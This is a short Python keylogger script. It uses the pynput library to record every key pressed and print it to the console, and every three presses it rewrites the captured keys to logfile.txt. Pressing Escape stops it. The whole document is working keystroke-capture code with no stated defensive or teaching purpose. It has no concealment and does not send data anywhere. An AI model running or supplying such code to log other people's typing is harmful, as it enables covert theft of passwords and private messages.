import pynput
from pynput.keyboard import Key, Listener
count = 0
keys =[]

def on_Press(key): 
    global keys, count

    keys.append(key)
    count+=1
    print("{0} key pressed".format(key))


    if count >=3:
        count =0
        write_keyfile(keys)
    


def on_Release(key):
    if key == Key.esc:
        return False

def write_keyfile(keys):
    with open("logfile.txt","w") as f:
        for key in keys:
            k = str(key).replace("'","")
            Key.space
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(str(k))

with Listener(on_press=on_Press, on_release=on_Release) as listener:
    listener.join()
